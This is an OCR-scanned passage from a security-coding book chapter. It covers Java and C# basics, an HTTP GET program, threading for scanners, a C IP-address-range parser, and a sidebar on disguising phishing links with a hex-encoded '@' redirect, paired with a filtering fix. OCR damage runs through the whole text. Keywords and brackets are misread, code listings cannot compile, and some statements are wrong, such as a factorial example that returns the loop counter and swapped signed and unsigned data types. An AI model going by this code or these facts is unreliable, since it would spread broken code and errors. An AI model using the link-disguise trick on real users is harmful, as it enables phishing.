^ 7 7 s Example 1.12 "While" Loop 
whilst condition ){ 
[Statement Block); 
> 
In a While loop, the test condition is located at the start of the loop. If the value of 
the condition is true, the loop executes; if it is false, the loop exits. The loop executes 
repeatedly until the test condition becomes false. 
^HMESS Example 1.13 "Do ... While" Loop 
[Statement Block] ; 
> whiles condition ); 
In a Do...While loop, the test condition is found at the end of the loop. After the 
St ill cma it Block is executed, the condition determines the loop execution. If the value of 
the condition is true, the Statement Block is repeated; if it is false, the loop exits. A 
Do,,, While loop is similar to the While loop with one weakness; the Statement Block 
must be executed at least once before the condition statement is read. For this reason, 
the For and While loops are more frequently used. 
It should be noted that for most purposes, all three looping constructs are function-
ally equivalent. 
^ • " ' ^ Example 1.14 Loop Equivalence—Iterate Five Times through a Loop 
"For" Loop 
for( i = 0 ; i < 5 ; i++ )( 
S tatement_Block; 
i 
"While" Loop 
int i - 0; 
While! i •= 5 ) f 
S ta t emen t _B1o ck; 
i++; 
} 
"Do...While" Loop 
int i - 0; 
Do[ 
Statement_Block; 
i++; 
) While( i c 5 ) 
In each of the preceding examples, the Statemait_Block was executed five times. 
Although different looping methods were used, the result is the same for each. In this 
way, all loop types are considered functionally equivalent. 

20 
Chapter 1 • Security Coding 
Methods 
A method (similar to a function in many languages) can be considered a miniature pro-
gram that is associated with a class. In many cases, a programmer may want to take a 
certain type of input, perform a specific operation on that input, and output the result in 
a particular format. The concept of methods was developed for just such repetitive opera-
tions. Methods are contained areas of a program that may be called to perform opera-
tions on data. They take a specific number of arguments and return an output value. The 
following is an example of a method that takes in an integer and returns its factorial: 
Example 1.15 Factorial Method 
int Factorial( int num ){ 
fori i = Inun - I) ; i > 0 s i-- )( 
num *= 1; 
// shorthand fori ruim = Tiujn * i 
} 
return nun; 
} 
In the top line, Factorial is the method name.The int keyword preceding the name 
indicates that the method returns an integer. The ( int uitfti ) section indicates that the 
method takes in an integer, which will be called num. The return statement specifies 
which value will be the method output. 
Classes 
Object-oriented programs are organized into constructs called classes. Like functions, 
classes are discrete programming units that have certain characteristics. Classes are groups 
of variables and functions of a certain type. A class may contain constructors, which 
define how^ an instance of that class, called an object, should he created. A class contains 
functions that are operations to be performed on instances of that class. 
For example, a programmer is working on a flight simulator for a plane manufac-
turer.The results will help the manufacturer make design decisions. Object-oriented 
programming is ideal for such a situation. It is possible to create a plane class that encap-
sulates all of the characteristics of a plane and functions that simulate its movements. 
Multiple instances of the plane class can be created, with each object containing its own 
unique data. 
A plane class may include several variables, such as the following: 
• 
Weight 
• 
Speed 
• 
Maneuverability 
• 
Position 
In this simulation, the programmer may want to simulate a test flight of the plane in 
certain scenarios. To modify the characteristics of an object, several accessor functions 
may be written: 

Security Coding • Chapter 1 
21 
SetWeight( int ) 
SetSpeed! int I 
SetManeuverability( int ) 
SetPosition! [ ] ) 
MoveToPosition! [ ] > 
A plane class for such an object might look like the lines of code in Example 1.16. 
Example 1.16 Plane Class 
1 public class planet 
2 
int Weight; 
3 
int Speed; 
4 
int Maneuverability 
5 Location Position /* The Location type denned elsewhere as an (x, y, z} coordinate */ 
6 
7 plane! int W, int S, int M, Location P }{ 
8 Weight = W; 
9 
Speed = S; 
10 Maneuverability = M; 
11 Position = P; 
12 } 
13 
14 SetWeight( plane current, int W ){ 
15 Current .Weight = W; 
16 } 
17 
18 
/* Additional Methods for SetSpeed, SetWeight, SetPosition, SetManeuverability, 
SetPosition defined here */ 
19 ) 
This code is used to initialize a plane object. A calling method specifies each of the 
required options that a plane object must have—in this case, a weight, a speed, a maneu-
verability rating, and a position.The SetWeight example demonstrates how operations on 
an object may be contained within the class that defines that object. 
A simulation program may create multiple instances of the plane class and run a set 
of'test flights."To test different plane characteristics, multiple instances of the plane class 
may be created; for example, plane! may weigh 5,000 pounds,, fly 500 mph, and have a 
maneuverability rating of 10, whereas phwel may weigh 6,000 pounds, fly 600 mph, and 
have a maneuverability rating of 8. In Java, instances of a class are created using the new 
keyword. A plane object named plane 1 can be created with the following commands: 
plane planel; 
Location p; 
p = new Location! 3, 4, 5 ); 
planel = new plane! 5,000, 500, 10, p ); 
Class hierarchies may also aid programmers through inheritance. Classes are arranged 
in tree-like structures, with each class having "parents" and potentially "children." A class 
"inherits" and may access the functions of any parent or superclass class. For example, if 
the plane class is a subclass of a class called vehicle, a plane object can access all of the 
functions that may be performed on a vehicle object. 
Classes provide many advantages that are not found in other language types. They 
provide an effective means of organizing programs into modules, which are readily 

22 
Chapter 1 • Security Coding 
inherited. Abstract classes can be created that act as interfaces. Interfaces define, but do 
not implement, certain functionality, leaving the task to subclasses. Classes can also be 
marked "private," to ensure that the internal contents of the class are inaccessible other 
than through specific functions. 
GET HTTP Headers 
When writing network and security programs, take advantage of the programming lan-
guage's built-in networking features. A program that obtains the Hypertext Transfer 
Protocol (HTTP) headers from a URL is shown in Example 1.17. 
Example 1.17 Get HTTP Headers 
1 import java.net.URL; 
2 
import JavaTnet-URLConnection; 
3 
import java.io.*; 
4 
import java.util.*; 
5 
6 public class HTTPGET{ 
7 
public static void main (String [] Args){ 
8 
try{ 
9 
FileWriter file = new FileWritert "OutFile" ); 
1 0 
PrintWriter OutputFile = new PrintWriter( file J; 
11 
12 
URL url = new U R M "http: //www. google, com" ); 
13 
URLConnection urlConnection = url.openConnectiont); 
14 
InputStream IS = urlConnection.getlTiputStE"eam() ; 
15 
16 
IS.closed ; 
17 
OutputFile.print[ IS ); 
18 
} catch (Exception e) { System.out.println(-Error"); } 
19 
} 
20 } 
This program demonstrates how to use Java for an HTTP GET command and also 
how to print results ro a file, both useful tasks in designing and implementing network 
tools. Lines 1 through 4 import the libraries necessary for both Uniform Resource 
Locator (URL) connections and input/output. Lines 9 and 10 initialize the FileWriter 
object to specify the output file, and then create a PrintWriter object, which is used to 
perform the file writing on line 17. 
In the Java. net. URLConneetion class, a connection takes multiple steps. First, a con-
nection object is created using the OpcnConnectionQ method. Parameters and options are 
set, and then the actual connection is made using the Connect() method. Once con-
nected, the information is received into IS, an object of InputStrcant. The stream is closed 
on line 16 and then sent to a file on line 17. 
Where exceptions may occur, Java uses a try and catch block (lines 8 and 18), which 
surrounds the potential problem code. On the catch line, the programmer specifies the 
type and name of the exception and any actions to take. 
For lower-level socket control, Java provides other networking classes, such as the 
following: 
java.net.socket 

Security Coding • Chapter 1 
23 
java.net.serversocket 
Java.net -datagramsocket 
java.net.multicastsocket 
Note, however, that none of these provides direct access to raw socket connections. 
If" this functionality is needed, consider C, C++, or C#. 
Web site users are often tricked into revealing sensitive data to criminal hackers, 
including credit card and social security numbers. Criminal hackers may perform 
these attacks by mirroring the look and feel of a site on their own servers, 
fooling users into thinking that they are accessing a legitimate site. One easy 
way to perform such an attack is to use a site's bulletin board to post legiti-
mate-looking, but malicious links. For example, a legitimate user may convince 
users of a bulletin board to click on a news story; 
http^/ww w, g oogl e. co m/?news=story 1.html 
A malicious user can redirect users by using a similar-looking link: 
http://www.google.com-
story=%40%77%77%77%2E%79%61%68%6F%6F%2E%63%6F%6D 
Can you tell where this link goes without clicking on it? It goes to 
http://www.yahoo.com. This redirection is accomplished by the sequence of 
characters at the end of the URL. These characters are "hex encoded" and repre-
sent the string: 
@www. yahoo.com 
This method of deception takes advantage of an early Web authentication 
scheme. Users gained access to sites by typing a URL in the format: 
http://user@site. Web browsers attempted to access the site listed after the @ 
symbol. Hackers can use an American Standard Code for Information 
Interchange (ASCII)-to-HEX conversion tool (such as 
http://d21c.com/sookietex/ASCII2HEX.html) to quickly create malicious links in 
this format. 
Prevention 
Preventing this attack on your site's bulletin board is straightforward. Create 
a filtering script to ensure that all links posted by users have the "/" symbol fol-
lowing the domain suffix. For example, if the filtering script analyzed and edited 
the preceding malicious link, the result would look like this: 
http://www.google.com/-
story=%40%77%77%77%2E%79%61%68%6F%6F%2E%63%6F%6D 
The link now generates an error, and the attack is prevented. Note that 
some modern browsers protect against this technique. The Firefox browser cur-
rently warns the user. 
C# 
In December 2001, Microsoft publicly released the C# language. Designed by Anders 
Hejlsberg, C# is intended to be a primary language for writing Web service compo-

24 
Chapter 1 • Security Coding 
nents for the .NET framework. Java has received much attention in the past decade for 
its portability, ease of use, and powerful class library. While the motivation behind 
Microsoft's development of C# is often heatedly argued, it can be seen as a response to 
Java's popularity. As the .NET component framework gains popularity, it is expected that 
many C++ and Visual Basic programmers will migrate to the C# platform. 
Despite being developed by Microsoft, however, C# is not a proprietary language. 
The C# standard is managed by the European Computer Manufacturers Association 
(EMCA).This fact may curb fears that Microsoft will restrict the language to prevent 
functionality with non-Microsoft products. 
Business Case for Migrating to C# 
If you listen to Microsoft, .NET is the future of computing. .NET provides a framework 
for Web services in which components written in different languages can interact. While 
many languages are supported, C# was designed to be the flagship language for .NET. 
Developers accustomed to programming in the Visual Studio environment will find it 
easy to migrate from Visual C++ to Visual C#.NET. 
C# will become the default language for Windows development. While architec-
ture-neutral Java may run on Windows, C# retains many Windows-specific features. For 
example, it is easy to access native Windows services using C#, such as graphical user 
interfaces and network objects. Programs currently written in C++ are easily ported to 
C#, whereas Java ports require substantially more effort and significant code rewriting. 
For Web service development, choosing a modern language is critical. Java and C# 
provide platform independence, the advantage of object-oriented programming, and 
shortened development cycles owing to features such as automatic memory manage-
ment. Along with these features, C# is an easy language for developers to learn, cutting 
down on training costs. Because of its many advantages and few disadvantages, many 
businesses may view migrating to C# as an economically sound decision. 
Language Characteristics 
C# is a modern (theoretically) platform-independent, object-oriented programming lan-
guage. It combines these modern features while retaining a syntax similar to C/C++ 
and Java; therefore, experienced programmers can learn it readily. C# differentiates itself 
fromjava with a less restrictive nature more closely aligned to C++.As with C + + , C # 
supports direct-to-executable compilation, a preprocessor, and structs. 
Object-Oriented 
C# is an object-oriented programming language. Object-oriented programming offers 
the following advantages : 
• 
Encapsulation Using classes, object-oriented code is very organized and 
modular. Data structures, data, and methods to perform operations on that data 
are all encapsulated within the class structure. 
• 
Inheritance Object-oriented organization and encapsulation allow program-
mers to easily reuse, or inherit, previously written code. Inheritance saves time 

Security Coding • Chapter 1 
25 
because programmers do not have to recode previously implemented function-
ality. 
• 
Data Hiding Objects, or instances of a class, may contain data that should 
not be altered by methods outside of the class. Programmers using C++ can 
"hide" data by designating certain variables "private." 
• 
Abstract Data Types Programmers can define classes, which are thought of 
as extensions of the struct command in C. A class may contain a pro gramme r-
defmed data type, as well as the operations that may be performed on objects 
of that type. 
Other Features 
C# also offers the following features: 
• 
C# provides automated garbage collection through the .NET runtime. 
• 
C# classes can have metadata stored as attributes. They can be marked "public," 
"protected,""internal,""protected internal," or "private." Each description gov-
erns how the class data can be accessed. 
• 
Versioning is made simple in C#. Developers can keep different versions of 
compiled files in different namespaces. This feature can significantly reduce the 
development time for large projects. 
• 
C# provides indexing functionality, where a class value can be accessed by a 
numerical index rather than a name.This feature provides some anonymity to 
the internal workings of a class. 
• 
Iteration is made simple in C# by using built-in iterators.The foreach method 
provides a means by which a programmer can specify how to iterate through a 
type of collection. 
• 
C# uses delegates, which can be thought of as a method pointer. A delegate 
contains information on calling a specific method of an object. Delegate 
objects are used in the C# event handler. 
Security 
C# security was designed to operate as part of the .NET runtime and provides several 
built-in security features: 
• 
Permissions The System.Security.Permissions namespace handles all code-per-
mission functionality. Code can contain permissions and request permissions 
from callers. The three types of permissions are code, identity, and role-bused. 
• 
Security policy Administrators can create a security policy, which restricts 
the actions that code may perform.The .NET Common Language Runtime 
(CLR) enforces these restrictions. 

26 
Chapter 1 • Security Coding 
• 
Principals A principal performs an action for a user. Principals are authenti-
cated using credentials supplied by the principal agent. .NET ensures that code 
only completes actions that it is authorized to perform. 
• 
Type-safety C# provides optional type-safety, which ensures that code may 
only have access to authorized memory locations. 
C#'s Hello, World! 
"Hello, World!" is the simplest program to use for accomplishing a task. Beginning pro-
grammers learn "Hello, World!" to develop an understanding of the basic structure of 
the language, as well as to learn how to use a compiler and run a program.The fol-
lowing is an example of "Hello, World!" in C#: 
Example 1.18 Hello, World! 
mfHHHfH uging system; 
class HelloWorld{ 
public static void Main(M 
Console.WriteLinel"Hello, World!"); 
! 
) 
The Hello, World! program is very similar toJava.The HclloWorid classe contains one 
main method that takes no arguments. The methods are public, allowing them to be 
accessed from outside of the Hello World class, and do not return a value represented by 
the "void" keyword. In C#, the Write Line statement is a member of the Console class. It 
prints the "Hello, World!" string to the standard output of the command line. 
Data Types 
Data types in programming languages are used to define variables before they are initial-
ized. The data type specifies the way a variable will be stored in memory and the type of 
data the variable holds. A variable is said to be an instance of a data type. In C#, there are 
two main forms of data types, values and references. Unlike Java, C# does not have 
primitive data types, such as int. In C#, all data types are objects. C# also allows direct 
memory pointers such as those used in C, but pointers may only be used in code labeled 
unsafe and are not inspected by the garbage collector. C# uses the following set of 
value-based data types: 
• 
Byte A byte is an integer that is stored in only 1 byte of memory. 
• 
Sbyte An sbyte is a signed byte integer that is stored in 1 byte of memory. 
• 
Short A short is an unsigned integer that is stored in 2 bytes of memory, 
• 
Ushort A ushort is a signed short integer that is stored in 2 bytes of memory. 
• 
Int An lut is a signed integer that is stored in 4 bytes of memory. 
• 
Uint A ttint is an unsigned integer that is stored in 4 bytes of memory. 

Security Coding • Chapter 1 
27 
• 
Long A httg is a signed integer that is stored in 8 bytes of memory. 
• 
Ulong A uloug is an unsigned integer that is stored in 8 bytes of memory 
• 
Float Afloat is used to represent floating-point numbers; 4 bytes are allocated 
in memory for each integer. 
• 
Double The double data type represents large floating-point numbers; 8 bytes 
of memory are used to store a double-type variable . 
• 
Object An "object" is a base type, which has no specific representation. 
• 
Decimal A "decimal" is a numerical type used for financial calculations. It is 
stored in 8 bytes of memory and has a mandatory "M" suffix. 
• 
String A "string" is a sequence of Unicode characters. There is no fixed 
storage size for strings. 
• 
Char The "char" data type represents characters. In Java, a char is a 16-bit Uni-
code character. 
• 
Boolean A "Boolean" represents one of two states, true or false, stored in 1 
byte of memory. 
In platform-dependent languages such as C, the memory allocation for different data 
types is often unclear. As with Java, C# and J# are platform-independent, and the size 
and format of all data types is specified by the language. Programmers do not need to be 
concerned with system differences. 
C# also uses reference types, where the data element points to a memory address 
rather than contain data. Arrays, objects, and interfaces are all reference types. Figure 1,3 
shows the data types and classifications for C#. 
Flow Control 
C# uses looping constructs to control program flow. When writing programs, certain 
tasks must be repeated a specific number of times or until a certain condition is met. 
Loops are programming constructs that simplify such repetitive tasks.There are three 
main types of loops: For, While, Do... While. 
I""t"" Example 1.19 "For" Loop 
Ullljjjlfjj 
r o r ( gr.arc_Condition ; Test_Condi.ti.on ; Operation |{ 
[Statement Block]; 
} 
The For loop is the most commonly used looping construct. When the loop begins 
execution, it checks the conditions following the For keyword. Given the 
Start_Co>idition, if the value of the Te$t_CondMon is true, the loop will execute. At the 
end of the loop, the Operation contained in the third field is performed on the 
Stai1_Coiidition. The loop repeats until the Tcst_Coiidition is false. 
The For loop is particularly suited for iteration. If the programmer wants the 
Statement Block to be executed five times, a simple loop configuration would be: 

28 
Chapter 1 • Security Coding 
For I i = 0 ; 
i < 5 ; i++ )f 
[Statement 
B l o c k ] ; 
Figure 1.3 C# Data Type Classification 
Predefined _ 
Types 
— 
Reference 
_ 
Types 
object 
— 
string 
i— 
Value 
_ 
Types 
— 
Enumeration 
Types 
Struct 
Simple 
Types 
Types 
— 
bocl 
Numeric 
_ 
Types 
— 
decimal 
— 
Floating-Point -
Types 
Integral 
Types 
— 
double 
'— 
float 
byte 
cnar 
mt 
long 
sbyte 
short 
uint 
ulong 
ushort 
J^NJ.^; Example 1.20 "While" Loop 
While! condition ){ 
[Statement Block]; 
In a While loop, the test condition is located at the start of the loop. If the value of 
the condition is true, the loop executes; if it is false, the loop exits. The loop executes 
repeatedly until the test condition becomes false. 
"»>•'» Example 1.21 "Do ... While" Loop 
[Statement Block]; 
} While( condition ); 
In a Do.,. While loop, the test condition is found at the end of the loop. After the 
Statement Block is executed, the condition determines the loop execution. If the value of 
the condition is true, the Statement Block is repeated; if it is false, the loop exits. A 
Do...While loop is similar to the While loop with one weakness: the Statement Block 

Security Coding • Chapter 1 
must be executed at least once before the condition statement is read. For this reason, 
the For and While loops are more frequently used. 
It should be noted that for most purposes, all three looping constructs are function-
ally equivalent 
••'••","- Example 1.22 Loop Equivalence- Iterate Five Times through a Loop 
For Loop: 
fori i = 0 ; i < 5 ; i++ )( 
Statement_Block; 
} 
While Loop: 
int i = 0; 
while{ i < 5 )( 
Statement_Block; 
} 
Do...While 
Loop: 
int i = 0; 
do{ 
Stat ement_Block; 
i++; 
> while{ i <: 5 } 
In each of the previous examples, the Statemcut_Block is executed five times. 
Different looping methods are used, but the result is the same for each. In this way, all 
loop types may be considered functionally equivalent. 
Methods 
A method (called a function in many languages) can be thought of as a miniature pro-
gram. In many cases, a programmer may want to take a certain type of input, perform a 
specific operation on that input, and output the result in a particular format. 
Programmers developed the concept of a method for just such repetitive operations. 
Methods are contained areas of a program that can be called to perform operations on 
data.They take a specific number of arguments and return an output value. The fol-
lowing is an example of a method that takes in an integer and returns its factorial: 
5 V ^ ' ! " Example 1.23 Factorial Method 
int Factorial{ int num ){ 
for{ i - tnuin - 1) t i > 0 ; i-- ){ 
num * = i; /* shorthand for: num = nufli * i */ 
1 
return i; 
) 

30 
Chapter 1 • Security Coding 
In the top line, Factorial is the method name. The int keyword preceding the name 
indicates that the method returns an integer.The (int nam ) section indicates that the 
method takes in an integer, which will be called until. The return statement specifies 
which value will be the method output. 
Classes 
Object-oriented programs are organized into constructs called classes. Like functions, 
classes are discrete programming units that have certain characteristics. Classes are groups 
of variables and functions of a certain type. A class can contain constructors, which 
define how an instance of that class, called an object, should be created. A class contains 
functions that are operations to be performed on instances of that class. 
For example, a programmer is working on a flight simulator for a plane manufac-
turer. The results will help the manufacturer make design decisions. Object-oriented 
programming is ideal for such a situation. It is possible to create a plane class that encap-
sulates all of the characteristics of a plane and functions that simulate its movements. 
Multiple instances of the plane class can be created, with each object containing its own 
unique data. 
A plane class may include several variables, including the following: 
• 
Weight 
• 
Speed 
• 
Maneuverability 
• 
Position 
In his simulation, the programmer may wish to simulate a test flight of the plane in cer-
tain scenarios. To modify the characteristics of an object, several accessor functions may 
be written: 
Seteightt int ) 
SetSpeed( int ) 
SetManeuverability{ int ) 
SetFositionl [ ] ) 
MoveToPositionj [ J ) 
A plane class for such an object might look like the lines of code in Example 1.24. 
ZL^. Example 1.24 Plane Class 
•••••II 
1 public class planet 
2 
int Weight ; 
3 
int Speed; 
4 
int Maneuverability 
5 Location Position /* The Location type defined elsewhere as an (x, yH z\ coordinate */ 
6 
7 
planet int W, int Sr int M, Location P )( 
8 
Weight = W; 
9 
Speed = S; 
10 
Maneuverability = K; 
11 
Position = P; 

Security Coding • Chapter 1 
12 1 
13 
14 setWeigbtI plane current, int w ){ 
15 Current.Weight = W; 
16 > 
17 
18 
/* Additional Methods for SetSpeed, SetWeight, SetPosition, SetManeuverability, 
SetPosition defined here */ 
19 ) 
This code is used ro initialize a plane object. A calling method specifies each of the 
required options that a plane object must have—in this case, a weight, a speed, a maneu-
verability rating, and a position.The SetWeight example demonstrates how operations 
on an object may be contained within the class that defines that object. 
A simulation program may create multiple instances of the plane class and run a set 
of" test flights." To test different plane characteristics, multiple instances of the plane class 
may be created. For example, plane 1 may weigh 5,000 pounds, fly 500 mph, and have a 
maneuverability rating of 10, whereas plane! may weigh 6,000 pounds, fly 600 mph, and 
have a maneuverability rating of 8. A plane object,planet, can be created with the fol-
lowing commands: 
plane planel; 
Location p; 
p = new Location( 3, 4, 5 ); 
planel = new planel 1,000, 400, 3, p ); 
Class hierarchies may also aid programmers through inheritance. Classes are arranged 
in tree-like structures, with each class having "parents" and potentially "children." A class 
"inherits" and may access the functions of any parent or superclass class. For example, if 
the plane class is a subclass of a class called "vehicle," a plane object can access all of the 
functions that can be performed on a vehicle object. There is a single root classin C# 
called System.object. All classes extend the System.object class. 
Classes provide many advantages that are not found in other language types,They 
provide an effective means of organizing programs into modules, which are readily 
inherited. Abstract classes can be created that act as interfaces. Interfaces define, but do 
not implement, certain functionality, leaving the task to subclasses. Classes can also be 
marked "private" to ensure that the internal contents of the class are inaccessible other 
than through specific functions. 
C# Threading 
The following is a simple C# program that creates two threads. Threads are essential for 
fast and efficient scanning tools. As multiple Internet Protocols (IPs) and ports are 
scanned, threading allows some scanning to be done in parallel, rather than sequentially. 
The following program creates two threads, each of which generates a 0 and 1 to stan-
dard out: 
1 using System; 
2 using System.Threading; 
3 
4 public class AThread ( 
5 

32 
Chapter 1 • Security Coding 
6 
public void ThreadActiont ) { 
7 
for [ int i=0 ; i < 2 ; i++ ) C 
8 
Console.WriteLinel "Thread loop executed: " * i I; 
9 
Thread.Sleep(l); 
10 
} 
11 
) 
12 } 
13 
14 public clsss Driver { 
15 
16 
public static void Main{ ) { 
17 
18 
AThread Threadl = new AThreaflf ); 
19 
AThread Thread2 = new AThread) ); 
20 
21 
ThreadStart TS1 = new ThreadStart! Threadl.ThreadAction ) 
22 
ThreadStart TS2 = new ThreadStart( Thread2.ThreadAction ) 
23 
24 
Thread Threads = new Thread( TS1 ); 
25 
Thread ThreadB = new Thread( TS2 ); 
26 
27 
ThreadA.Startf 
); 
28 
ThreadB.Startf 
); 
29 
} 
30 
} 
On line 2, the System is imported.The threading namespace provides access to all of 
the functionality needed to implement a program that uses threads. In the AThread class, 
the ThreadAction method on lines 6 through 11 prints out a 0 and a l.The purpose of 
this is to determine the order in which the threads are being executed.The 
Thread.Slcep(l); command on line 9 puts the thread to sleep for one millisecond, thereby 
allowing the second thread time to execute. 
Now for the Driver class. Lines 18 and 19 instantiate objects of the AThread class. 
Lines 21 and 22 call the first method that is invoked when the threads are executed. 
Lines 24 and 25 create the threads ThreadA and ThreadB. The Thread type declared in 
these lines comes from the System. Thread tug namespace imported on line 2. The threads 
are then executed on lines 27 and 28. 
The program results in output to standard out of 
0 
o 
l 
l 
This output shows that the two threads are executed in parallel. Sequential execu-
tion would have led to an output in the order of: 0; 1; (); 1. Think about how threads are 
useful for tools such as port scanners. 
Case Study: Command Line IP Address Parsing 
Command line IP address parsing is a key component for nearly all network-based tools 
and utilities. Parsing in target addresses or allowing users the flexibility to specify indi-
vidual targets in addition to subnets and multiple networks is not an option for"best-of-

Security Coding • Chapter 1 
breed" applications. Nmap, a freeware port scanning utihty that can be downloaded from 
www.insecure.org, set the standard for IP address parsing via the command line in the 
late 1990s; however, if you have ever tried to read through or learn the Nmap code base, 
you know that is no easy task. 
The following code is a functional example of an efficient, advanced IP address 
parsing C code developed to be compiled within Microsoft's Visual Studio. The five files 
encompass all of the functionality required to parse an IP address, and while this is 
somewhat more than a proof of concept, the compiled program merely prints the 
addresses to STDOUT. In production, it would not be difficult to push these addresses 
to an array. 
ji V N ^ It E i i 1 
^ S 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
1* 
* ipv4_parse.c 
*/ 
((include <rstdio.h> 
#include <stdlib.h> 
((include <striitg.h> 
((include "ipv4_parse.h-
/* 
* ipv4_parse_sv() 
* 
* 
*/ 
s t a t i c 
int ipv4_parse_sv 
(ipv4_parse_ctx 
*ctx 
i n t 
char 
{ 
int wc = 0; 
int x 
= 0 ; 
// check if single value is wildcard (entire range from 0-255) 
wc = (strchrlsv, '*') == NULL ? 0 : 1); 
i f{wc) 
{ 
if(strlen(sv> != Oxl) 
< 
return(-lJ; 
} 
for(x=0; x <- OxFF; ++x) 
1 
ctx->m_st;ate£idx] Ix] = 1; 
J 
) 
// single value (ex. " 1 " , "2", "192', "10") 
else 
t 
ctx->m_statetidx]((unsigned char) atoi(sv)] = 1; 
} 
return(O); 
idLx 

Chapter 1 • Security Coding 
45 
} 
46 
47 
i* 
48 
* ipv4_parse_r() 
49 
* 
50 
* 
51 
•/ 
52 
s t a t i c 
53 
int ipv4_parse_r 
(ipv4_parge_ctx 
*ctx 
„ 
54 
int 
idx 
55 
char 
*r 
56 
( 
57 
unsigned char hi = 0; 
58 
unsigned char lo = 0; 
59 
char 
*pl = HULL; 
60 
int 
x = 0 ; 
61 
62 
// parse low value £ high value from range 
63 
pi = strchr(r, ' - ' ) ; 
64 
*pl = •\01; 
65 
++pl; 
66 
67 
lo = (unsigned char) atoi{r ); 
68 
hi = (unsigned char) atoi(pi); 
69 
70 
// if low value is larger than high value, 
71 
// return error (ex. 
"200-100"). 
72 
if(lo >= hi) 
73 
{ 
74 
return(-l>; 
75 
} 
76 
77 
// enable range 
78 
for(x=lo; x <= hi; + +x) 
79 
{ 
80 
ctx->nustate[idx] [x] = 1; 
81 
} 
82 
83 
return(O) ; 
84 
} 
85 
86 
/* 
87 
* ipv4_parse_tok() 
88 
* 
89 
* 
90 
v 
91 
s t a t i c 
92 
int ipv4_parse_tok 
(ipv4_parse_ctx 
*ctx 
93 
int 
idx 
94 
char 
*tok 
95 
{ 
96 
int ret = 0; 
97 
98 
// does value have a dash indicating range in i t ? 
99 
// (ex. "1-5"); if not r treat as single value (ex " 1 " , "2", '**) 
100 
// if soH treat as range (ex. "1-5") 
101 
ret • {strchr(tok r 
'-•) « MULL) ? 

Security Coding • Chapter 1 
102 
ipv4_parse_sv{ctx, idx, tok) : 
103 
ipv4_parse_r (ctx, idx, tok) ; 
104 
return(ret); 
105 } 
106 
107 /* 
108 
* ipv4_parse_octet() 
109 * 
110 
-
1 1 1 */ 
112 static 
113 int ipv4_parse_octet 
{ipv4_parse_ctx 
*ctx 
t 
114 
int 
idx 
115 
char 
*octet 
116 { 
117 
char *tok = NULL; 
118 
int 
ret = 0; 
119 
120 
// parse octet by comma character, if comma 
121 
// character present 
122 
tok 
= strtokloctet, " , " ) ; 
123 
i£(tok != NULL) 
124 
t 
125 
whileltok [= NULL) 
126 
{ 
127 
// treat each comma separated value as a 
128 
// range or single value (like, "2-100", "7", etc) 
129 
ret 
= ipv4_parse_tok(ctx, idx, tok) ; 
130 
i£(ret < 0) 
131 
{ 
132 
return(-l) j 
133 
} 
134 
135 
tok = strtoktNULL, " , " ) ; 
136 
) 
137 
} 
138 
11 otherwise, no comma is present, treat as a range 
139 
// or single value (like, "2-100", 
"7", etc) 
140 
else 
141 
{ 
142 
ret 
= ipv4_parse_tok(ctx, idx, octet); 
143 
if (ret < 0) 
144 
( 
145 
return(-l) ; 
146 
} 
147 
} 
148 
149 
return(O); 
150 } 
151 
152 /* 
1 53 
* ipv4_parse_ctx_in.it () 
154 
-
155 * the ip range is treated as four arrays of 256 
156 * unsigned char values, each array represents one 
157 * of the four octets in an ip address. positions 
158 * in the array are marked as either one or zero. 

Chapter 1 • Security Coding 
159 
160 
161 
162 
163 
164 
165 
166 
167 
163 
169 
170 
171 
172 
173 
174 
175 
176 
177 
178 
179 
180 
181 
182 
183 
184 
185 
186 
187 
188 
189 
190 
191 
192 
193 
194 
195 
196 
197 
198 
199 
200 
201 
202 
203 
204 
205 
206 
207 
208 
209 
210 
211 
212 
213 
214 
215 
positions are marked as one if those values were 
supplied in the range. for example: 
char *range = "10.1.1.1 1; 
would result in 
the 10th 
byte of the 1st array 
being set to 
the value 
of one, 
while the 
1st 
byte of the 2ndH 3rd and 4th arrays being set to 
one, 
once 
the range has been 
completely 
parsed and 
all values 
stored 
in the arrays {the statej, a 
series of 
for 
loops 
can 
be 
used 
to iterate 
through the range. 
IP address 
range 
parser for nmap-style command 
line syntax. 
* example: 
* •192.163,1,2,3,4-12,70.*'' 
*/ 
int ipv4_parse_Ctx_init 
{ipv4_parse_ctx 
*ctx 
char 
char *oc [4]; 
int 
x = 0; 
if (ctx 
== NULL | | 
range == HULL] 
{ 
return(-l); 
memset(ctx, 0x00, sizeof(ipv4_parse_ctx)); 
// parse ip address range into 4 octets 
if((oc[0] = strtoMrange, •, •)) == NULL || 
{oc(l] = strtok(NULL , ".")) == NULL || 
{oc(21 = strtok(NULL , '.")) ™ MULL || 
{oc(3] = strtok(NULL, 
".")) ™ MULL} 
( 
return(-l); 
} 
// parse each octet 
if(ipv4_parse_octet(ctxr 0r oc[0]} < 0 | 
ipv4_parse_octet(ctx, 1, oc[l]J < 0 | 
ipv4_parse_octet(ctx, 1, oc [2]) < 0 | 
ipv4_parse_octet(ctx, 3, oc[3]) < 0) 
return(-l); 

Security Coding • Chapter 1 
21 6 
returnIO); 
217 ) 
218 
219 i* 
220 
* ipv4_parse_next_addr() 
221 
* 
222 
* t h i s function is used to i t e r a t e through the 
223 
* previously parsed IP address range. 
224 
-
225 
-
226 
* 
227 
* 
228 * 
229 * 
230 V 
231 int ipv4_parse_next 
(ipv4_parse_ctx 
*ctx 
232 
unsigned int 
*addr 
233 < 
234 
235 
236 
237 
238 
239 
240 
241 
242 
243 
244 
245 
246 
247 
248 
249 
250 
251 
252 
253 
254 
255 
256 
257 
258 
259 
260 
if(CtX 
== MULL | | 
addr == NULL) 
{ 
r e t u r n ( - l ) ; 
> 
for( ; ctx->m_index[Q] <= OxFF; + -t-ctx->m_index [ 0 ] ) 
{ 
i f ( c t x - > m _ s t a t e [ 0 ] [ c t x - > m _ i n d e x [ 0 ] ] 
!= 0} 
{ 
for { ; ctx->m_index[l] <= OxFF; ++ctx->m_index[l)) 
{ 
i f ( c t x - > m _ s t a t e ( l ] ( c t x - > m _ i n d e x [ l ) ] 
1 = 0 ) 
{ 
fort ; ctx->rn_index[2] <= OxFF; +-t-ctx->rri_index[2] ) 
{ 
i f ( c t x - > m _ s t a t e [ 2 ] [ c t x - > m _ i n d e x [ 2 ] ] 
!= 0) 
( 
f o r i ; ctx->m_index[3] <= OxFF; 
++ctx->m_index[ 3 ] ) 
1 
i f ( c t x - > m _ s t a t e [ 3 1 [ c t x -
